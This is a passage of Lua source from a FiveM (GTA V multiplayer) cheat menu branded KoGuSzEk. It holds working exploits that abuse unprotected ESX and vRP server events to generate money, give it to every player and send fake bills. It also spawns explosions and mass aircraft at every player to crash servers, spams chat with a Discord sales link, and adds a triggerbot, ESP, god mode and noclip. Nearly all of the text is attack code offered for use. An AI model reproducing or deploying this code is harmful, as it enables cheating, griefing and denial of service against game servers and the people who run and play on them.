                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                        end
						
				if esplines and esp then
                            DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255)
                        end
                    end
                end
            end
            if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
            end
            if oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
                local dd = getEntity(PlayerId(-1))
                if IsEntityAPed(dd) then
                    if IsPedInAnyVehicle(dd, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0)
                            end
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
            end
            if rainbowf then
                for i = 1, 7 do
                    Citizen.Wait(100)
                    SetPedWeaponTintIndex(GetPlayerPed(-1), 1198879012, i)
                    i = i + 1
                    if i == 7 then
                        i = 1
                    end
                end
            end
            if BlowDrugsUp then
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_drugs:startHarvestWeed')
                        TriggerServerEvent('esx_drugs:startHarvestCoke')
                        TriggerServerEvent('esx_drugs:startHarvestMeth')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startTransformWeed')
                        TriggerServerEvent('esx_drugs:startTransformCoke')
                        TriggerServerEvent('esx_drugs:startTransformMeth')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startSellWeed')
                        TriggerServerEvent('esx_drugs:startSellCoke')
                        TriggerServerEvent('esx_drugs:startSellMeth')
                        TriggerServerEvent('esx_drugs:startSellOpium')
                        TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
                        TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
                        TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
                        TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
                        TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
                        TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
                        TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
                        TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
                        TriggerServerEvent('esx_illegal_drugs:startSellWeed')
                        TriggerServerEvent('esx_illegal_drugs:startSellCoke')
                        TriggerServerEvent('esx_illegal_drugs:startSellMeth')
                        TriggerServerEvent('esx_illegal_drugs:startSellOpium')
                        Citizen.Wait(1000)
                    end
                )
            end
            if blowall then
                --[[for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'AlphaV ~ 5391'
                    )
                end--]]
                for i = 0, 128 do
                    Citizen.Wait(500)
                    AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                end
            end
            if crosshair then
                ShowHudComponentThisFrame(14)
            end
            if crosshairc then
                bz('~r~+', 0.495, 0.484)
            end
			if showinfo then
                dol('<FONT COLOR="#00f7ff">~h~Menu by KoGuSzEk ', 0.00, 0.0)
				dol('<FONT COLOR="#00f7ff">~h~Twoje id ~w~: ~p~~h~' .. GetPlayerServerId(closestPlayer) .. ' ', 0.0, 0.03)
			
            end
            if crosshairc2 then
                bz('~r~.', 0.4968, 0.478)
            end
			if koguszspam then
						TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d')
				
				end
            if cN then
                local de = false
                local df = 130
                local dg = 0
                for f = 0, 128 do
                    if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                        ped = GetPlayerPed(f)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                        if de then
                            if NetworkIsPlayerTalking(f) then
                                local dh = k(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                    dh.r,
                                    dh.g,
                                    dh.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < df then
                            if not de then
                                if NetworkIsPlayerTalking(f) then
                                    local dh = k(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                        dh.r,
                                        dh.g,
                                        dh.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end
            if showCoords then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
                bz('~r~X:~w~ ' .. roundx, 0.05, 0.00)
                bz('~r~Y:~w~ ' .. roundy, 0.11, 0.00)
                bz('~r~Z:~w~ ' .. roundz, 0.17, 0.00)
            end

            function carthieftroll()
                for i = 0, 128 do
                    local bK = GetEntityCoords(GetPlayerPed(i))
                    TriggerServerEvent('esx_carthief:alertcops', bK.x, bK.y, bK.z)
                end
            end

            function automaticmoneyesx()
                local m = KeyboardInput('Warning, this value can be multiplied!!!', '', 100)
                if cO then
                    if m ~= '' then
                        local confirm = KeyboardInput('Are you sure? y/n', '', 0)
                        if confirm == 'y' then
                        end
                        av('~h~~g~Testing all ~y~ESX ~g~scripts~w~.', true)
                        TriggerServerEvent('esx_carthief:pay', m)
                        TriggerServerEvent('esx_jobs:caution', 'give_back', m)
                        TriggerServerEvent('esx_fueldelivery:pay', m)
                        TriggerServerEvent('esx_carthief:pay', m)
                        TriggerServerEvent('esx_godirtyjob:pay', m)
                        TriggerServerEvent('esx_pizza:pay', m)
                        TriggerServerEvent('esx_ranger:pay', m)
                        TriggerServerEvent('esx_garbagejob:pay', m)
                        TriggerServerEvent('esx_truckerjob:pay', m)
                        TriggerServerEvent('AdminMenu:giveBank', m)
                        TriggerServerEvent('AdminMenu:giveCash', m)
                        TriggerServerEvent('esx_gopostaljob:pay', m)
                        TriggerServerEvent('esx_banksecurity:pay', m)
                        TriggerServerEvent('esx_slotmachine:sv:2', m)
                    elseif confirm == 'n' then
                        av('~h~~w~Operation cancelled~w~.', false)
                    else
                        av('~h~~w~Invalid Confirmation~w~.', true)
                        av('~h~~w~Operation cancelled~w~.', false)
                    end
                end
            end

            function vrpdestroy()
                --[[for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        '',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. ''
                    )
                end--]]
                TriggerServerEvent(
                    'lscustoms:payGarage',
                    {
                        costs = -99999999
                    }
                )
                TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
                TriggerServerEvent('Banca:deposit', 999999999)
                TriggerServerEvent('bank:deposit', 999999999)
                local di = GetPlayerServerId(PlayerId())
                for i = 0, 128 do
                    TriggerServerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
                end
            end
            if bv then
                esxdestroyv2()
                nukeserver()
            end

            function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
                        TriggerServerEvent('esx-qalle-hunting:reward', 9999999999)
                        TriggerServerEvent('esx-qalle-hunting:sell')
                        --[[for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'AlphaV ~ 5391'
                            )
                        end--]]
                        for i = 0, 128 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                '5391 was here',
                                '',
                                43161337
                            )
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
            end

            function giveeveryone()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
                        TriggerServerEvent('esx-qalle-hunting:reward', 9999999999)
                        TriggerServerEvent('esx-qalle-hunting:sell')

                        for i = 0, 128 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                125475600
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                125475600
                            )
                        end
                    end
                )
            end

            function nukeserver()
                Citizen.CreateThread(
                    function()
                        local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dn))
                        end
                        --[[for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '',
                                {
                                    141,
                                    211,
                                    255
                                },
                                ''
                            )
                        end--]]
                        for i = 0, 128 do
                            local dl =
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                        end
                    end
                )
            end
            if servercrasherxd then
                Citizen.CreateThread(
                    function()
                        local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        local dze = 'bombushka'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dn))
                        end
                        while not HasModelLoaded(GetHashKey(dze)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dze))
                        end
                        for i = 0, 128 do
                            for ak = 100, 150 do
                                local dl =
                                    CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dze), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dze), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dze), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true)
                            end
                        end
                    end
                )
            end
            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end
            if TriggerBot then
                local dp, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
                if dp then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end
            DisplayRadar(true)
            if RainbowVeh then
                local dq = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
            end
            if rainbowh then
                for i = -1, 12 do
                    Citizen.Wait(100)
                    local a8 = k(1.0)
                    SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
                    SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a8.r, a8.g, a8.b)
                    if i == 12 then
                        i = -1
                    end
                end
            end
            if t2x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
            end
            if t4x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
            end
            if t10x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
            end
            if t16x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
            end
            if txd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
            end
            if tbxd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
            end
            if Noclip then
                local dr = 2
                local ds =
                    IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                    PlayerPedId(-1)
                FreezeEntityPosition(PlayerPedId(-1), true)
                SetEntityInvincible(PlayerPedId(-1), true)
                local dt = GetEntityCoords(entity)
                DisableControlAction(0, 32, true)
                DisableControlAction(0, 268, true)
                DisableControlAction(0, 31, true)
                DisableControlAction(0, 269, true)
                DisableControlAction(0, 33, true)
                DisableControlAction(0, 266, true)
                DisableControlAction(0, 34, true)
                DisableControlAction(0, 30, true)
                DisableControlAction(0, 267, true)
                DisableControlAction(0, 35, true)
                DisableControlAction(0, 44, true)
                DisableControlAction(0, 20, true)
                local du = 0.0
                local dv = 0.0
                if GetInputMode() == 'MouseAndKeyboard' then
                    if IsDisabledControlPressed(0, 32) then
                        du = 0.5
                    end
                    if IsDisabledControlPressed(0, 33) then
                        du = -0.5
                    end
                    if IsDisabledControlPressed(0, 34) then
                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
                    end
                    if IsDisabledControlPressed(0, 35) then
                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
                    end
                    if IsDisabledControlPressed(0, 44) then
                        dv = 0.21
                    end
                    if IsDisabledControlPressed(0, 20) then
                        dv = -0.21
                    end
                end
                dt = GetOffsetFromEntityInWorldCoords(ds, 0.0, du * (dr + 0.3), dv * (dr + 0.3))
                local bL = GetEntityHeading(ds)
                SetEntityVelocity(ds, 0.0, 0.0, 0.0)
                SetEntityRotation(ds, 0.0, 0.0, 0.0, 0, false)
                SetEntityHeading(ds, bL)
                SetEntityCollision(ds, false, false)
                SetEntityCoordsNoOffset(ds, dt.x, dt.y, dt.z, true, true, true)
                FreezeEntityPosition(ds, false)
                SetEntityInvincible(ds, false)
                SetEntityCollision(ds, true, true)
            end
        end
    end
)
Citizen.CreateThread(
    function()
        FreezeEntityPosition(entity, false)
        local dw = 1
        local dx = true
        local dy = nil
        local dz = nil
        local dA = nil
        local dB = 1
        local dC = 1
        local dD = {
            1.0,
            2.0,
            4.0,
            10.0,
            512.0,
            9999.0
        }
        KoGuSzEk.CreateMenu('KoGuSzEkV', "~s~* <FONT COLOR='#00f7ff'>KOGUSZMENU ~s~* ")
        KoGuSzEk.SetSubTitle('KoGuSzEkV', '<FONT COLOR="#00f7ff">†KoGuSzEk#3251† ')
        KoGuSzEk.CreateSubMenu('SelfMenu', 'KoGuSzEkV', '~w~~h~Menu wlasne')
